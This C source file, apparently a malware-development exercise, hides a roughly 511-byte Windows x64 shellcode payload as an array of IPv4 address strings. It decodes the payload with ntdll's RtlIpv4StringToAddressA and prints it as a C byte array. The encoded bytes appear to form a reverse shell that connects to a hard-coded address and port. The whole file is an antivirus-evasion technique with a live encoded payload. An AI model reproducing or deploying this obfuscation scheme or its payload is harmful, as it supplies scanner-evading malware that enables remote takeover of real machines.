#include "glassBox.h"

char* Ipv4Array[] = {
		"252.72.131.228","240.232.204.0","0.0.65.81","65.80.82.72","49.210.81.86","101.72.139.82","96.72.139.82","24.72.139.82",
		"32.72.139.114","80.72.15.183","74.74.77.49","201.72.49.192","172.60.97.124","2.44.32.65","193.201.13.65","1.193.226.237",
		"82.72.139.82","32.65.81.139","66.60.72.1","208.102.129.120","24.11.2.15","133.114.0.0","0.139.128.136","0.0.0.72",
		"133.192.116.103","72.1.208.68","139.64.32.73","1.208.80.139","72.24.227.86","72.255.201.65","139.52.136.72","1.214.77.49",
		"201.72.49.192","65.193.201.13","172.65.1.193","56.224.117.241","76.3.76.36","8.69.57.209","117.216.88.68","139.64.36.73",
		"1.208.102.65","139.12.72.68","139.64.28.73","1.208.65.139","4.136.65.88","65.88.94.72","1.208.89.90","65.88.65.89",
		"65.90.72.131","236.32.65.82","255.224.88.65","89.90.72.139","18.233.75.255","255.255.93.73","190.119.115.50","95.51.50.0",
		"0.65.86.73","137.230.72.129","236.160.1.0","0.73.137.229","73.188.2.0","17.92.172.16","190.1.65.84","73.137.228.76",
		"137.241.65.186","76.119.38.7","255.213.76.137","234.104.1.1","0.0.89.65","186.41.128.107","0.255.213.106","10.65.94.80",
		"80.77.49.201","77.49.192.72","255.192.72.137","194.72.255.192","72.137.193.65","186.234.15.223","224.255.213.72","137.199.106.16",
		"65.88.76.137","226.72.137.249","65.186.153.165","116.97.255.213","133.192.116.10","73.255.206.117","229.232.147.0","0.0.72.131",
		"236.16.72.137","226.77.49.201","106.4.65.88","72.137.249.65","186.2.217.200","95.255.213.131","248.0.126.85","72.131.196.32",
		"94.137.246.106","64.65.89.104","0.16.0.0","65.88.72.137","242.72.49.201","65.186.88.164","83.229.255.213","72.137.195.73",
		"137.199.77.49","201.73.137.240","72.137.218.72","137.249.65.186","2.217.200.95","255.213.131.248","0.125.40.88","65.87.89.104",
		"0.64.0.0","65.88.106.0","90.65.186.11","47.15.48.255","213.87.89.65","186.117.110.77","97.255.213.73","255.206.233.60",
		"255.255.255.72","1.195.72.41","198.72.133.246","117.180.65.255","231.88.106.0","89.187.224.29","42.10.65.137","218.255.213.0"

};


typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
	PCSTR	S,
	BOOLEAN Strict,
	PCSTR* Terminator,
	PVOID	Addr
	);

BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, IN SIZE_T OriginalPayloadSize ,OUT PBYTE* ppDAdderss, OUT SIZE_T* pDsize) {
	PBYTE	pBuffer = NULL,
		TmpBuffer = NULL;
	SIZE_T sBuffSize = 0;
	PCSTR Terminator = NULL;
	NTSTATUS STATUS = 0;

	// Getting RtlIpv4StringToAddressA address from ntdll.dll
	fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");

	if (pRtlIpv4StringToAddressA == NULL) {
		warn("GetProcAddress Failed with Error : %d \n", GetLastError());
		return EXIT_FAILURE;
	}

	// Getting the real size of the payload which is the number of IPv4 addresses * 4
	sBuffSize = NmbrOfElements * 4;

	// Allocating memory which will hold the deobfuscated code
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		warn("HeapAlloc Failed with Error: %d \n", GetLastError());
		return EXIT_FAILURE;
	}

	TmpBuffer = pBuffer;

	// Loop through all the IPv4 addresses saved in IPv4Array

	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one IPv4 at a time
		// Ipv4Array[i] is a single IPv4 address from array Ipv4Array
		if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
			warn("RtlIpv4StringToAddressA Failed at [%s] With Error 0x%0.0.8X", Ipv4Array[i], STATUS);
			return EXIT_FAILURE;
		}

		// 4 bytes are written to tmpbuffer at a tim
		// Therefore Tmpbuffer will be incremented by 4 to store the upcoming 4 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 4);

	}

	// Save the base addresses & size of the deobfuscated payload

	*ppDAdderss = pBuffer;
	*pDsize = OriginalPayloadSize;

	info("Decoded bytes: \n");

	okay("unsigned char payload[] = ");

	for (SIZE_T i = 0; i < *pDsize; i++) {

		if (i % 16 == 0)
			printf("\"");

		printf("\\x%02x", pBuffer[i]);

		if ((i + 1) % 16 == 0 || i == sBuffSize - 1)
			printf("\"\n");
	}

	printf("\n");

	return EXIT_SUCCESS;
}

int main(void)
{
	PBYTE pDecoded = NULL;
	SIZE_T decodedSize = 0;

	SIZE_T numElements = sizeof(Ipv4Array) / sizeof(Ipv4Array[0]);

	if (Ipv4Deobfuscation(
		Ipv4Array,
		numElements,
		511, // MAKE SURE TO ADD THE ORIGINAL PAYLOADSIZE WITHOUT THE PADDING //
		&pDecoded,
		&decodedSize) != EXIT_SUCCESS)
	{
		warn("Deobfuscation failed\n");
		return EXIT_FAILURE;
	}

	HeapFree(GetProcessHeap(), 0, pDecoded);

	info("Payload Successfully Deobfuscated");

	return EXIT_SUCCESS;
}